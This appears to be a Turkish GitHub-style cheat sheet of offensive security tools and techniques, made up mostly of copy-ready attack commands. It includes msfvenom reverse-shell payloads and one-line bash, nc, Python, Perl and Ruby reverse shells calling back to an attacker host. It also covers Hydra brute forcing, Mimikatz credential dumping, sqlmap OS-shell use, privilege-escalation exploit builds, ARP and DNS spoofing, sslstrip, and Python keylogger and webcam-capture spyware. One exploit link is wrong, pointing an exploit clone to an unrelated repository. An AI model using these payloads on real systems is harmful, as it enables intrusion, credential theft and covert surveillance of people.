# 🔓 Hack Araçları ve İleri Teknikler

> **⚠️ Bu araçlar yalnızca eğitim ve yetkili güvenlik testleri için kullanılmalıdır. Yanlış kullanım yasadışıdır.**

---

## 📑 İçindekiler

1. [Şifre Kırma Araçları](#şifre-kırma-araçları)
2. [Network Hack Araçları](#network-hack-araçları)
3. [Sistem Hack Araçları](#sistem-hack-araçları)
4. [Web Hack Araçları](#web-hack-araçları)
5. [Wireless Hack Araçları](#wireless-hack-araçları)
6. [Privilege Escalation](#privilege-escalation)
7. [Reverse Shell ve Backdoor](#reverse-shell-ve-backdoor)
8. [Spoofing ve MITM](#spoofing-ve-mitm)
9. [Sniffing ve Packet Manipulation](#sniffing-ve-packet-manipulation)
10. [Keylogger ve Spyware](#keylogger-ve-spyware)
11. [Malware Analizi](#malware-analizi)
12. [Şifreleme ve Stealth](#şifreleme-ve-stealth)

---

## 🔐 Şifre Kırma Araçları

### 1. **Hashcat** - GPU Hızlandırmalı Hash Kırma
```bash
# Kurulum
apt install hashcat

# MD5 (mode: 0)
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# NTLM Windows (mode: 1000)
hashcat -m 1000 hashes.txt rockyou.txt

# bcrypt (mode: 3200)
hashcat -m 3200 hashes.txt rockyou.txt

# MySQL (mode: 200)
hashcat -m 200 hashes.txt rockyou.txt

# PostgreSQL (mode: 12)
hashcat -m 12 hashes.txt rockyou.txt

# Linux Shadow (mode: 1800)
hashcat -m 1800 hashes.txt rockyou.txt

# Brute Force Attack
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a

# Combination Attack (dictionary + rules)
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Rule tabanlı
hashcat -m 0 hashes.txt dict.txt -r rules.txt

# GPU ile hızlı işlem
hashcat -m 0 -d 1 hashes.txt rockyou.txt

# Benchmark
hashcat -m 0 -b
```

### 2. **John the Ripper** - Professional Hash Cracker
```bash
# Kurulum
apt install john

# Unshadow (shadow dosyası formatı)
unshadow /etc/passwd /etc/shadow > passwords.txt
john passwords.txt

# Belirli format
john --format=md5crypt hashes.txt

# Wordlist ile
john --wordlist=rockyou.txt --format=md5 hashes.txt

# Brute Force
john --incremental=digits hashes.txt

# Belirli ön ek
john --format=md5 --rules hashes.txt

# Sonuçları göster
john --show hashes.txt

# SSH anahtarını kır
john id_rsa.txt

# RAR arşivini kır
rar2john archive.rar > hashes.txt
john hashes.txt

# ZIP arşivini kır
zip2john archive.zip > hashes.txt
john hashes.txt
```

### 3. **Hydra** - Online Brute Force
```bash
# Kurulum
apt install hydra

# SSH
hydra -l admin -P rockyou.txt 192.168.1.100 ssh -V

# FTP
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# HTTP POST
hydra -l admin -P rockyou.txt http-post-form://example.com/login:user=^USER^&pass=^PASS^:invalid

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-basic://example.com

# SMTP
hydra -L users.txt -P pass.txt smtp://mail.example.com

# IMAP
hydra -L users.txt -P pass.txt imap://mail.example.com

# POP3
hydra -L users.txt -P pass.txt pop3://mail.example.com

# MySQL
hydra -l root -P pass.txt mysql://192.168.1.100

# MSSQL
hydra -l sa -P pass.txt mssql://192.168.1.100

# VNC
hydra -l admin -P pass.txt vnc://192.168.1.100

# RDP
hydra -L users.txt -P pass.txt rdp://192.168.1.100

# Paralel çalışma
hydra -l admin -P rockyou.txt -t 16 192.168.1.100 ssh

# Verbose mode
hydra -l admin -P rockyou.txt -V 192.168.1.100 ssh
```

### 4. **Medusa** - Paralel Brute Force
```bash
# Kurulum
apt install medusa

# SSH
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh

# FTP
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ftp

# HTTP
medusa -h example.com -u admin -P rockyou.txt -M http -m DIR:/login.php

# Paralel host taraması
medusa -H hosts.txt -u admin -P rockyou.txt -M ssh -T 16
```

### 5. **Rainbowcrack** - Rainbow Table Kırma
```bash
# Kurylum (Commercial)
# Önceden oluşturulmuş rainbow table kullanma
rcrack *.rt -h hash_value

# Hash dosyasını kır
rcrack *.rt -i hashes.txt

# Sonuçları kaydet
rcrack *.rt -h hash_value -o results.txt
```

---

## 🌐 Network Hack Araçları

### 1. **Nmap** - Network Mapping ve Port Scanning
```bash
# Kurulum
apt install nmap

# Ping Sweep (host discovery)
nmap -sn 192.168.1.0/24

# Stealth Scan (SYN)
sudo nmap -sS 192.168.1.100

# UDP Scan
sudo nmap -sU 192.168.1.100

# OS Detection
sudo nmap -O 192.168.1.100

# Version Detection
nmap -sV 192.168.1.100

# Service Detection
nmap -sV -p 22,80,443 192.168.1.100

# Firewall Evasion
nmap -f -D decoy1,decoy2 192.168.1.100

# Aggressive Scanning
nmap -A -T4 192.168.1.100

# Script Scanning
nmap --script=default 192.168.1.100

# Vulnerability Scripts
nmap --script=vuln 192.168.1.100

# Timing Templates (paranoid to insane)
nmap -T0 192.168.1.100  # Paranoid
nmap -T5 192.168.1.100  # Insane

# Output
nmap -A 192.168.1.100 -oN output.txt -oX output.xml
```

### 2. **Metasploit** - Exploitation Framework
```bash
# Kurulum (Kali Linux'te önceden yüklü)
sudo systemctl start postgresql
sudo msfdb init
msfconsole

# Msfconsole komutları:
search ms17_010
search eternalblue
search shellcode

# Modül seç
use exploit/windows/smb/ms17_010_eternalblue

# Payload seç
set PAYLOAD windows/meterpreter/reverse_tcp

# Hedef ayarla
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Çalıştır
run

# Payload oluştur (msfvenom)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > payload.php
```

### 3. **Wireshark** - Packet Analysis ve Sniffer
```bash
# Kurulum
apt install wireshark

# GUI
sudo wireshark

# Komut satırı (tshark)
sudo tshark -i eth0

# Filtreler
# ip.src == 192.168.1.100
# tcp.port == 80
# http.request.method == "POST"
# dns.qry.name contains "facebook"

# Dosyaya kaydet
sudo tshark -i eth0 -w capture.pcap

# Dosyadan oku
tshark -r capture.pcap
```

### 4. **Tcpdump** - Network Traffic Capture
```bash
# Kurulum
apt install tcpdump

# Tüm trafiği yakala
sudo tcpdump

# Belirli arayüzü
sudo tcpdump -i eth0

# Port filtreleme
sudo tcpdump -i eth0 port 80

# IP filtreleme
sudo tcpdump -i eth0 src 192.168.1.100

# Protokol filtreleme
sudo tcpdump -i eth0 tcp
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 icmp

# Dosyaya kaydet
sudo tcpdump -i eth0 -w capture.pcap

# Paket numarası
sudo tcpdump -i eth0 -c 100

# Verbose mode
sudo tcpdump -i eth0 -v
```

### 5. **Scapy** - Packet Manipulation
```bash
# Kurulum
pip install scapy

# Python scripti örneği
python3 << 'EOF'
from scapy.all import *

# Ping gönder
ping_packet = IP(dst="8.8.8.8")/ICMP()
send(ping_packet)

# TCP port scan
port_scan = IP(dst="192.168.1.100")/TCP(dport=80, flags="S")
send(port_scan)

# DNS query
dns_packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
send(dns_packet)

# ARP scan
arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
sendp(arp_packet)
EOF
```

---

## 🖥️ Sistem Hack Araçları

### 1. **Hashcats** - Hash Kırma (İleri)
```bash
# Kurulum
apt install hashcat

# WPA2 (mode: 2500)
hashcat -m 2500 capture.hccapx rockyou.txt

# Windows Domain (NTLM)
hashcat -m 1000 ntlm.txt rockyou.txt

# Shadow Hashes (Linux)
hashcat -m 1800 shadow.txt rockyou.txt

# Cisco IOS (type 5)
hashcat -m 500 cisco.txt rockyou.txt

# LDAP
hashcat -m 1600 ldap.txt rockyou.txt

# SAM file (Windows)
python3 -c "import hashlib; print(hashlib.md4(b'password').hexdigest())"
```

### 2. **Mimikatz** - Windows Credential Dumper
```bash
# İndirme
# https://github.com/gentilkiwi/mimikatz/releases

# Windows'ta çalıştır (administrator gerekli)
mimikatz.exe

# Komutlar:
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::lsa
vault::list
token::list
token::impersonate
```

### 3. **LaZagne** - Password Recovery
```bash
# Kurulum
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip install -r requirements.txt

# Windows
python laZagne.py all

# Linux
python laZagne.py all

# Mac
python laZagne.py all

# Belirli uygulama
python laZagne.py browser
python laZagne.py wifi
```

### 4. **Volatility** - Memory Dumping
```bash
# Kurulum
apt install volatility

# Memory dump analizi
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Ağ bağlantıları
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Process dump
volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234 -D ./

# Hash dumplama
volatility -f memory.dump --profile=Win7SP1x64 hashdump
```

---

## 🌍 Web Hack Araçları

### 1. **SQLMap** - SQL Injection Automation
```bash
# Kurulum
apt install sqlmap

# Temel tarama
sqlmap -u "http://example.com/page.php?id=1"

# POST verisi
sqlmap -u "http://example.com/login" --data="user=admin&pass=pass"

# Veritabanı numaralandırma
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tablo çekme
sqlmap -u "http://example.com/page.php?id=1" -D database --tables

# Veri dump
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump

# Admin bulma
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump --where="role='admin'"

# Shell çalıştırma
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# OS dosyası oku
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Agresif mod
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3

# Batch mode
sqlmap -u "http://example.com/page.php?id=1" --batch
```

### 2. **Burp Suite** - Web Proxy ve Testing
```bash
# Kurulum
apt install burpsuite

# Başlat
burpsuite &

# Proxy ayarları:
# 127.0.0.1:8080

# Browser proxy ayarı yapıldıktan sonra:
# 1. Intercept trafiği
# 2. Request'i düzenle
# 3. Scanner koştur
# 4. Intruder ile brute force
# 5. Repeater ile tekrar gönder
```

### 3. **XSSStrike** - XSS Vulnerability Finder
```bash
# Kurulum
git clone https://github.com/s0md3v/XSSstrike.git
cd XSSstrike
pip install -r requirements.txt

# Tarama
python xsstrike.py -u "http://example.com/page.php?search=test"

# Cookie ile
python xsstrike.py -u "http://example.com/" -c "session=abc123"

# POST verisi
python xsstrike.py -u "http://example.com/comment" -d "comment=test&post=1"
```

### 4. **SQLi Scanner** - Otomatic SQL Injection
```bash
# Kurulum
git clone https://github.com/s0md3v/Killer.git
cd Killer
pip install -r requirements.txt

# Tarama
python killer.py -u "http://example.com/" --batch
```

### 5. **NoSQLMap** - NoSQL Injection
```bash
# Kurulum
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt

# Tarama
python nosqlmap.py -u "http://example.com/api/user" -p "username=admin&password=test"
```

---

## 📡 Wireless Hack Araçları

### 1. **Aircrack-ng** - WiFi Hacking
```bash
# Kurulum
apt install aircrack-ng

# Monitor modu aç
sudo airmon-ng start wlan0

# Ağları tara
sudo airodump-ng wlan0mon

# Belirli ağı dinle
sudo airodump-ng -c 6 -bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (handshake için)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Handshake yakaladıktan sonra kırma
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# WEP Cracking
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# Monitor modunu kapat
sudo airmon-ng stop wlan0mon
```

### 2. **Reaver** - WPS Brute Force
```bash
# Kurulum
apt install reaver

# Monitor modu aç
sudo airmon-ng start wlan0

# WPS PIN kırma
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -a -c 6

# Yavaş mod
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -p3

# Belirli PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345678
```

### 3. **PixieWPS** - WPS Offline Crack
```bash
# Kurulum
git clone https://github.com/wiire-a/pixiewps.git
cd pixiewps
make

# Reaver çıktısından kırma
pixiewps -e SSID -r REAVER_PIN -s PASSWORD

# Brute force
pixiewps -e SSID --bruteforce
```

### 4. **Hostapd** - Fake AP Oluşturma
```bash
# Kurulum
apt install hostapd

# Yapılandırma dosyası (hostapd.conf)
cat > hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Başlat
sudo hostapd hostapd.conf

# DHCP server
sudo dnsmasq -d -C dnsmasq.conf
```

---

## 🔑 Privilege Escalation

### 1. **LinPEAS** - Linux Privilege Escalation
```bash
# İndirme
https://github.com/carlospolop/PEASS-ng/releases/download/latest/linpeas.sh

# Çalıştır
chmod +x linpeas.sh
./linpeas.sh

# Çıktıyı kaydet
./linpeas.sh > linpeas_output.txt
```

### 2. **WinPEAS** - Windows Privilege Escalation
```bash
# İndirme
# https://github.com/carlospolop/PEASS-ng/releases

# Çalıştır
winPEAS.exe
winPEASany.exe
```

### 3. **Sudo Exploit**
```bash
# sudo versiyonu kontrol
sudo -V

# CVE-2021-3493 (OverlayFS)
git clone https://github.com/xkaneiki/CVE-2021-3493.git
cd CVE-2021-3493
gcc exploit.c -o exploit
./exploit

# CVE-2021-4034 (polkit)
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc -w exploit.c -o exploit -lpolkit-gobject-1 `pkg-config --cflags --libs polkit-gobject-1`
./exploit
```

### 4. **Kernel Exploit**
```bash
# Kernel versiyonu kontrol
uname -r

# Kernel exploit bulma
searchsploit linux kernel

# CVE-2021-22555 (Netfilter)
git clone https://github.com/google/kaggle-solutions.git
```

---

## 🔄 Reverse Shell ve Backdoor

### 1. **Msfvenom** - Payload Oluşturma
```bash
# Kurulum (metasploit içinde)
apt install metasploit-framework

# Windows Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Linux Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# PHP Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# Python Reverse Shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.py

# VBScript
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vbs -o payload.vbs

# Aspx (ASP.NET)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# PowerShell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=4444 -f psh -o payload.ps1
```

### 2. **Bash Reverse Shell**
```bash
# Bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# Nc
nc -e /bin/bash 192.168.1.50 4444

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="192.168.1.50";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.new("192.168.1.50",4444);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 3. **Empire** - PowerShell Exploitation
```bash
# Kurulum
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup.sh

# Başlat
sudo python empire

# Listener oluştur
listeners
usemodule http
```

---

## 🎭 Spoofing ve MITM

### 1. **ARP Spoofing** - Arp Saldırısı
```bash
# Arpspoof kurulum
apt install dsniff

# ARP spoofing
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Saldırı + Packet Forward
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
sudo sysctl -w net.ipv4.ip_forward=1
```

### 2. **DNS Spoofing** - Sahte DNS
```bash
# dnsspoof kurulum
apt install dsniff

# DNS spoofing
sudo dnsspoof -i eth0 -f hosts.txt

# Hosts dosyası örneği:
# 192.168.1.50 facebook.com
# 192.168.1.50 google.com
```

### 3. **DHCP Spoofing**
```bash
# ISC-DHCP-Server
apt install isc-dhcp-server

# Yapılandırma
cat > dhcpd.conf << 'EOF'
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.100 192.168.1.200;
  option routers 192.168.1.50;
  option domain-name-servers 192.168.1.50;
}
EOF

# Başlat
sudo dhcpd -cf dhcpd.conf
```

### 4. **Ettercap** - MITM Framework
```bash
# Kurulum
apt install ettercap-graphical

# Başlat
sudo ettercap -G

# Komut satırı
sudo ettercap -T -q -i eth0 -M arp /192.168.1.100/ /192.168.1.1/
```

---

## 🔍 Sniffing ve Packet Manipulation

### 1. **Driftnet** - Resim Çekme
```bash
# Kurulum
apt install driftnet

# Başlat
sudo driftnet -i eth0

# Dosyaya kaydet
sudo driftnet -i eth0 -d output_dir
```

### 2. **URLSnarf** - URL Çekme
```bash
# Kurulum (dsniff paketi içinde)
apt install dsniff

# URL yakala
sudo urlsnarf -i eth0
```

### 3. **SSLstrip** - HTTPS'i HTTP'ye İndir
```bash
# Kurulum
apt install sslstrip

# Başlat
sudo sslstrip -l 8080

# ARP spoofing ile
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

---

## 🖱️ Keylogger ve Spyware

### 1. **Python Keylogger**
```python
# keylogger.py
from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

### 2. **Screenshot Taker**
```python
# screenshot.py
from PIL import ImageGrab
import time

while True:
    img = ImageGrab.grab()
    img.save(f"screenshot_{time.time()}.png")
    time.sleep(5)
```

### 3. **Webcam Capture**
```python
# webcam.py
import cv2

cap = cv2.VideoCapture(0)

while True:
    ret, frame = cap.read()
    cv2.imwrite(f"webcam_{int(time.time())}.jpg", frame)
    time.sleep(5)

cap.release()
```

---

## 🦠 Malware Analizi

### 1. **Cuckoo Sandbox** - Malware Detonation
```bash
# Kurulum
apt install cuckoo

# Başlat
cuckoo

# Web arayüzü: http://localhost:8080

# Dosya gönderi
cuckoo submit malware.exe
```

### 2. **VirusTotal** - Online Malware Scanner
```bash
# API kullanımı
curl -F "file=@malware.exe" https://www.virustotal.com/api/v3/files \
  -H "x-apikey: YOUR_API_KEY"
```

### 3. **Radare2** - Binary Analysis
```bash
# Kurulum
apt install radare2

# Başlat
r2 binary_file

# Disassemble
aaa  # Analyze all
pdf @main  # Print function
```

---

## 🔐 Şifreleme ve Stealth

### 1. **Stegano** - Steganography
```bash
# Kurulum
apt install steghide

# Dosya gizle
steghide embed -cf image.jpg -ef secret.txt -p password

# Dosya çıkart
steghide extract -sf image.jpg -p password
```

### 2. **GPG** - File Encryption
```bash
# Kurulum
apt install gnupg

# Şifreleme
gpg -c secret.txt

# Şifreyi çöz
gpg secret.txt.gpg
```

### 3. **Tor Browser** - Anonymity
```bash
# Kurulum
apt install torbrowser-launcher

# Başlat
torbrowser-launcher
```

### 4. **Proxychains** - Proxy Kullanımı
```bash
# Kurulum
apt install proxychains4

# Yapılandırma
sudo nano /etc/proxychains4.conf

# Çalıştırma
proxychains4 curl https://icanhazip.com
proxychains4 nmap -sV 192.168.1.100
```

---

## 📊 Özet - Kurulum Komutu

```bash
#!/bin/bash

echo "🔓 Hack Araçları Kurulumu Başlıyor..."

sudo apt update && sudo apt upgrade -y

# Temel hack araçları
sudo apt install -y \
    hashcat \
    john \
    hydra \
    medusa \
    nmap \
    metasploit-framework \
    wireshark \
    tcpdump \
    aircrack-ng \
    reaver \
    sqlmap \
    burpsuite \
    dsniff \
    ettercap-graphical \
    driftnet \
    sslstrip \
    steghide \
    gnupg \
    torbrowser-launcher \
    proxychains4 \
    volatility \
    binwalk \
    r2

# GitHub araçlarını kur
mkdir ~/hack-tools
cd ~/hack-tools

git clone https://github.com/gentilkiwi/mimikatz.git
git clone https://github.com/AlessandroZ/LaZagne.git
git clone https://github.com/wiire-a/pixiewps.git
git clone https://github.com/carlospolop/PEASS-ng.git
git clone https://github.com/s0md3v/XSSstrike.git
git clone https://github.com/BC-SECURITY/Empire.git
git clone https://github.com/codingo/NoSQLMap.git

# Python bağımlılıkları
pip install pynput pillow opencv-python scapy

echo "✓ Tüm hack araçları kuruldu!"
```

---

## ⚠️ YASAL UYARLAR

### ✅ LEGAL KULLANIM
- Kendi sistemler üzerinde test
- Yetkili penetration testing
- Eğitim amaçlı kullanım
- Bug bounty programları
- CTF (Capture The Flag)

### ❌ YASAL OLMAYAN KULLANIM
- İzinsiz sistem erişimi
- Veri hırsızlığı
- DDoS saldırıları
- Malware yayınlaması
- Kimlik hırsızlığı

---

**Son Güncelleme**: 2026-07-13
**Uyarı**: Tüm araçlar eğitim amaçlıdır. Sorumluluk kullanıcıya aittir.
⭐ Faydalı buldum ise star verin!
